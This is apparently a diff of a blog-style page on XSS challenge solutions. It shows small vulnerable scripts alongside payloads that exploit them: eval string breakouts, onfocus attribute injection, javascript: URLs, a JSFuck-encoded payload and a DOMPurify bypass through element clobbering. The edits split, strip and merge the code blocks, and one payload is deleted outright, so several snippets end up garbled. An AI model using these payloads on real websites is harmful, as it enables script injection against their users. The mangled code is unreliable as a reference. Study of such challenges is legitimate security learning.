@@ -9,17 +9,18 @@
 
 ?jeff=";alert(1)//
 
-<!-- Challenge --><divid="uganda"></div><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=`<input type="text" placeholder="${wey}" class="form-control">`</script>
+<!-- Challenge --><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=``</script>
 
 ?wey="autofocus%20onfocus=alert(1337)"
 
-<!-- Challenge --><formid="ricardo"method="GET"><inputname="milos"type="text"class="form-control"placeholder="True"value="True"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
+<!-- Challenge --><formid="ricardo"method="GET"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
 
-?ricardo=javascript:alert(1337)
+?ricardo=javascript:
+alert(1337)
 
 <h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>
 
-?markassbrownlee=<img src="1"onerror="alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B">
+?markassbrownlee=
 
 /* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)
 
@@ -39,9 +40,11 @@ Function(/ALERT(1337)/.source.toLowerCase())()
 
 <h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>
 
-<aid=okhref=javasCript:alert(1337)>
+<aid=okhref=javasCript:
+alert(1337)>
 
-?boomer=<aid=okhref="tel:alert(1)">
+?boomer=<aid=okhref="tel:
+alert(1)">
 
 Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)
 
@@ -76,125 +79,28 @@ buuctf-re之CTF分析
 
 ```
 <!-- Challenge --><h2id="spaghet"></h2><script> spaghet.innerHTML= (newURL(location).searchParams.get('somebody') ||"Somebody") +" Toucha Ma Spaghet!"</script>
-```
-
-
-
-```
 <h2id="maname"></h2><script>letjeff = (newURL(location).searchParams.get('jeff') ||"JEFFF")letma =""eval(`ma = "Ma name${jeff}"`)setTimeout(_=>{ maname.innerText= ma },1000)</script>
-```
-
-
-
-```
 ?jeff=";alert(1)//
-```
-
-
-
-```
-<!-- Challenge --><divid="uganda"></div><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=`<input type="text" placeholder="${wey}" class="form-control">`</script>
-```
-
-
-
-```
+<!-- Challenge --><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=``</script>
 ?wey="autofocus%20onfocus=alert(1337)"
-```
-
-
-
-```
-<!-- Challenge --><formid="ricardo"method="GET"><inputname="milos"type="text"class="form-control"placeholder="True"value="True"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
-```
-
-
-
-```
-?ricardo=javascript:alert(1337)
-```
-
-
-
-```
+<!-- Challenge --><formid="ricardo"method="GET"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
+?ricardo=javascript:
+alert(1337)
 <h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>
-```
-
-
-
-```
-?markassbrownlee=<img src="1"onerror="alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B">
-```
-
-
-
-```
+?markassbrownlee=
 /* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)
-```
-
-
-
-```
 ?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29
-```
-
-
-
-```
 mafia = (newURL(location).searchParams.get('mafia') ||'1+1')mafia = mafia.slice(0,50)mafia = mafia.replace(/[`'"+-!\[]]/gi,'_')mafia = mafia.replace(/alert/g,'_')eval(mafia)
-```
-
-
-
-```
 eval(8680439..toString(30))(1337)
-```
-
-
-
-```
 eval(location.hash.slice(1))
-```
-
-
-
-```
 ?mafia=eval(location.hash.slice(1))#alert(1337)
-```
-
-
-
-```
 Function(/ALERT(1337)/.source.toLowerCase())()
-```
-
-
-
-```
 Function(/ALERT(1337)/.source.toLowerCase())()
-```
-
-
-
-```
 <h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>
-```
-
-
-
-```
-<aid=okhref=javasCript:alert(1337)>
-```
-
-
-
-```
-?boomer=<aid=okhref="tel:alert(1)">
-```
-
-
-
-```
+<aid=okhref=javasCript:
+alert(1337)>
+?boomer=<aid=okhref="tel:
+alert(1)">
 Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)
 ```
 
